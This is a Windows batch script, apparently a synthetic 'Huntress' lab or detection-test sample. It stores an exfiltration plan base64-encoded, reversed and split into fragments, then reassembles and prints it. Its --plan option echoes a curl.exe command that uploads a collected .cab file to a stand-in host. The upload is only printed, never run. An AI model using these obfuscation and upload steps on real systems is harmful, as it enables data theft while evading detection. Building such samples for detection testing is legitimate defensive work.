@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|reverse
rem HUNTRESS-MATERIAL:ZGFvbHB1L2RpbGF2bmkuZWxwbWF4ZS45MjY2NGI5NDBiLy86c3B0dGg9bHJ1X2Rhb2xwdXxiYWMuOTI2NjRiOTQwYi10Y2VsbG9jXGJhTHNzZXJ0bnVIXGNpbGJ1UFxzcmVzVVw6Qz1odGFwX2VjcnVvc3w5MjY2NGI5NDBiLW5naWFwbWFjPWRpX25naWFwbWFjfGVub249ZWdhdWduYWxfdHhlbnxlZ2F1Z25hbF9zc29yYz1ocGFyZ3wxPXRudW9jX2VnYXRzfGV4ZS5scnVjPXJldHBhZGF8ZXRvbWVyX2Rhb2xwdSxyZWZzbmFydF9lcmFwZXJwLGxhY29sX2V0YWNvbD1zcGV0c3wxPXY=
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "h0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=curl.e"& rem HUNTRESS quote compound
set "h1=xe|stage_count=1|graph=cross_language|next_language=none|campaign_id"& rem HUNTRESS quote compound
set "h2==campaign-b049b46629|source_path=C:\Users\Public\HuntressLab\collect"& rem HUNTRESS quote compound
set "h3=-b049b46629.cab|upload_url=https://b049b46629.example.invalid/upload"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "cfg=%h0%%h1%%h2%%h3%"
echo(!cfg!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo curl.exe upload C:\Users\Public\HuntressLab\collect-b049b46629.cab to https://b049b46629.example.invalid/upload
exit /b 0
